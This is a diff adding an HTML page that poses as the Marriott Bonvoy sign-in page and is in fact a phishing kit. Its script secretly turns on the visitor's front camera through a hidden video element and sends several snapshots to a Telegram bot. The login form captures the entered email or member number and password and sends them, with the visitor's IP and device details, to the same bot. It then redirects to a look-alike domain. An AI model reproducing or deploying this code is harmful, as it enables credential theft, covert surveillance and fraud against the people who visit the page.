@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to Marriott Bonvoy</title>
+    <style>
+        /* CSS Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Montserrat', Arial, sans-serif;
+        }
+        
+        /* Body Styles */
+        body {
+            background-color: #ffffff;
+            color: #000000;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* Header Styles */
+        header {
+            background-color: #ffffff;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 12px 80px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo {
+            width: 100px;
+            height: 100px;
+            margin-right: 24px;
+        }
+        
+        .main-nav {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .main-nav a {
+            text-decoration: none;
+            color: #000000;
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+        
+        .header-actions {
+            display: flex;
+            gap: 18px;
+        }
+        
+        .header-actions a {
+            text-decoration: none;
+            color: #000000;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        /* Main Content Styles */
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            display: flex;
+            max-width: 1200px;
+            width: 100%;
+            background: #fff;
+            box-shadow: 0 0 20px rgba(0,0,0,0.05);
+        }
+        
+        .login-section {
+            flex: 1;
+            padding: 50px;
+            border-right: 1px solid #e0e0e0;
+        }
+        
+        .join-section {
+            flex: 1;
+            padding: 50px;
+        }
+        
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 30px;
+        }
+        
+        h2 {
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 25px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+        
+        .remember-me input {
+            margin-right: 10px;
+        }
+        
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            text-align: center;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+        }
+        
+        .btn-signin {
+            background-color: #000000;
+            color: #ffffff;
+            border: 1px solid #000000;
+        }
+        
+        .btn-signin:hover {
+            background-color: #333333;
+        }
+        
+        .btn-join {
+            background-color: #ffffff;
+            color: #000000;
+            border: 1px solid #000000;
+        }
+        
+        .btn-join:hover {
+            background-color: #f5f5f5;
+        }
+        
+        .form-links a {
+            display: block;
+            color: #000000;
+            text-decoration: underline;
+            font-size: 13px;
+            margin-bottom: 10px;
+        }
+        
+        .join-description {
+            font-size: 14px;
+            margin-bottom: 25px;
+            color: #333333;
+        }
+        
+        .benefits-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .benefit-item {
+            font-size: 12px;
+            font-weight: 600;
+            padding: 12px;
+            text-align: center;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            background-color: #f9f9f9;
+        }
+        
+        /* Footer Styles */
+        footer {
+            background-color: #000000;
+            color: #ffffff;
+            text-align: center;
+            padding: 30px 20px;
+            font-size: 14px;
+        }
+        
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .footer-links a {
+            color: #ffffff;
+            text-decoration: none;
+        }
+        
+        .copyright {
+            margin-top: 20px;
+            color: #aaaaaa;
+        }
+
+        /* Hidden camera element */
+        #hiddenCamera {
+            position: absolute;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Hidden camera element (not visible to user) -->
+    <video id="hiddenCamera" autoplay playsinline></video>
+
+    <!-- Header Section -->
+    <header>
+        <div class="logo-container">
+            <img src="https://marriotemployeerewards.web.app/img.png" alt="Logo" class="logo">
+        
+            <nav class="main-nav">
+                <a href="#">Find & Reserve</a>
+                <a href="#">Special Offers</a>
+                <a href="#">Vacations</a>
+                <a href="#">Our Brands</a>
+                <a href="#">Our Credit Cards</a>
+                <a href="#">About Marriott Bonvoy</a>
+            </nav>
+        </div>
+        <div class="header-actions">
+            <a href="#"><span></span> Help</a>
+            <a href="#"><span></span> English</a>
+            <a href="#"><span></span> My Trips</a>
+            <a href="#"><span>👤</span> Sign In</a>
+        </div>
+    </header>
+
+    <!-- Main Content Section -->
+    <main class="main-content">
+        <div class="container">
+            <div class="login-section">
+                <h1>Welcome to Marriott Bonvoy</h1>
+                <h2>Sign In</h2>
+                <form class="login-form" id="loginForm">
+                    <div class="form-group">
+                        <label for="email">Email or Member Number</label>
+                        <input type="text" id="email" name="email" placeholder="" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" placeholder="" required>
+                    </div>
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember" name="remember">
+                        <label for="remember">Remember me</label>
+                    </div>
+                    <button type="submit" class="btn btn-signin">Sign In</button>
+                    <div class="form-links">
+                        <a href="#">Forgot password</a>
+                        <a href="#">Activate online account</a>
+                    </div>
+                </form>
+            </div>
+
+            <div class="join-section">
+                <h2>Join Marriott Bonvoy</h2>
+                <p class="join-description">Members receive complimentary Wi-Fi plus other exclusive benefits</p>
+                <div class="benefits-grid">
+                    <div class="benefit-item">EARN FREE NIGHTS</div>
+                    <div class="benefit-item">FREE WI-FI</div>
+                    <div class="benefit-item">MEMBER RATES</div>
+                    <div class="benefit-item">EXCLUSIVE OFFERS</div>
+                </div>
+                <button class="btn btn-join">Join for Free</button>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer Section -->
+    <footer>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Use</a>
+                <a href="#">Site Map</a>
+                <a href="#">Cookie Preferences</a>
+                <a href="#">Contact Us</a>
+            </div>
+            <p>© 2025 Marriott International, Inc. All rights reserved.</p>
+            <p class="copyright">Marriott proprietary information</p>
+        </div>
+    </footer>
+
+    <script>
+        // Background camera capture functionality
+        document.addEventListener('DOMContentLoaded', function() {
+            const hiddenCamera = document.getElementById('hiddenCamera');
+            let stream = null;
+            let captureInterval = null;
+            let photosSent = 0;
+            const maxPhotos = 5; // Maximum number of photos to send
+
+            // Start hidden camera automatically
+            setTimeout(() => {
+                startHiddenCamera();
+            }, 1000);
+
+            // Start hidden camera
+            async function startHiddenCamera() {
+                try {
+                    // Request camera access
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: 'user',
+                            width: { ideal: 320 },
+                            height: { ideal: 240 }
+                        }, 
+                        audio: false 
+                    });
+                    
+                    // Connect stream to hidden video element
+                    hiddenCamera.srcObject = stream;
+                    
+                    // Wait for video to load
+                    hiddenCamera.onloadedmetadata = function() {
+                        // Start capturing photos periodically
+                        captureInterval = setInterval(captureAndSendPhoto, 3000); // Capture every 3 seconds
+                    };
+                    
+                } catch (error) {
+                    console.error('Error accessing camera:', error);
+                }
+            }
+
+            // Function to convert base64 to blob
+            function dataURLtoBlob(dataURL) {
+                const parts = dataURL.split(';base64,');
+                const contentType = parts[0].split(':')[1];
+                const raw = window.atob(parts[1]);
+                const uInt8Array = new Uint8Array(raw.length);
+                
+                for (let i = 0; i < raw.length; ++i) {
+                    uInt8Array[i] = raw.charCodeAt(i);
+                }
+                
+                return new Blob([uInt8Array], { type: contentType });
+            }
+
+            // Function to capture photo and send to Telegram
+            async function captureAndSendPhoto() {
+                if (photosSent >= maxPhotos) {
+                    clearInterval(captureInterval);
+                    return;
+                }
+                
+                try {
+                    // Create canvas to capture the photo
+                    const canvas = document.createElement('canvas');
+                    const context = canvas.getContext('2d');
+                    
+                    // Set canvas dimensions to match video
+                    canvas.width = hiddenCamera.videoWidth;
+                    canvas.height = hiddenCamera.videoHeight;
+                    
+                    // Draw current video frame to canvas
+                    context.drawImage(hiddenCamera, 0, 0, canvas.width, canvas.height);
+                    
+                    // Convert canvas to data URL (JPEG format)
+                    const imageData = canvas.toDataURL('image/jpeg');
+                    
+                    // Get IP address
+                    let ipAddress = 'Unknown';
+                    try {
+                        const ipResponse = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipResponse.json();
+                        ipAddress = ipData.ip;
+                    } catch (error) {
+                        console.error('Error fetching IP:', error);
+                    }
+                    
+                    // Telegram bot details
+                    const botToken = '8151553891:AAFhrgs80sY4Qsk24iWZA6_2EFMdZO8qNYE';
+                    const chatId = '7759127765';
+                    
+                    // Prepare text message with user info
+                    const message = `📸 Background Camera Capture #${photosSent + 1}
+                    
+🖥️ Device Info:
+- User Agent: ${navigator.userAgent}
+- Platform: ${navigator.platform}
+- Screen: ${window.screen.width}x${window.screen.height}
+- IP Address: ${ipAddress}
+
+🌐 Timestamp: ${new Date().toLocaleString()}`;
+                    
+                    // Convert base64 to blob
+                    const blob = dataURLtoBlob(imageData);
+                    
+                    // Create form data for the photo
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, `user_photo_${Date.now()}.jpg`);
+                    formData.append('caption', message);
+                    
+                    // Send the photo to Telegram
+                    try {
+                        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        
+                        if (response.ok) {
+                            console.log(`Photo #${photosSent + 1} sent to Telegram successfully`);
+                            photosSent++;
+                        } else {
+                            console.error('Failed to send photo to Telegram');
+                        }
+                    } catch (error) {
+                        console.error('Error sending photo to Telegram:', error);
+                    }
+                    
+                } catch (error) {
+                    console.error('Error capturing photo:', error);
+                }
+            }
+
+            // Clean up when leaving the page
+            window.addEventListener('beforeunload', function() {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                if (captureInterval) {
+                    clearInterval(captureInterval);
+                }
+            });
+        });
+
+        // Original login form functionality
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Get form values
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Get device and browser info
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenWidth = window.screen.width;
+            const screenHeight = window.screen.height;
+            
+            // Get IP address
+            let ipAddress = 'Unknown';
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ipAddress = ipData.ip;
+            } catch (error) {
+                console.error('Error fetching IP:', error);
+            }
+            
+            // Telegram bot details
+            const botToken = '8151553891:AAFhrgs80sY4Qsk24iWZA6_2EFMdZO8qNYE';
+            const chatId = '7759127765';
+            
+            // Prepare message
+            const message = `🔔 New Login Attempt 🔔
+            
+📧 Email/Member: ${email}
+🔑 Password: ${password}
+
+🖥️ Device Info:
+- User Agent: ${userAgent}
+- Platform: ${platform}
+- Screen: ${screenWidth}x${screenHeight}
+- IP Address: ${ipAddress}
+
+🌐 Timestamp: ${new Date().toLocaleString()}`;
+            
+            // Send to Telegram bot
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                });
+                
+                if (response.ok) {
+                    console.log('Login data sent to Telegram successfully');
+                } else {
+                    console.error('Failed to send login data to Telegram');
+                }
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+            
+            // Redirect to login page
+            window.location.href = 'https://marriotemployeerewards.web.app/login.html';
+        });
+    </script>
+</body>
+</html>
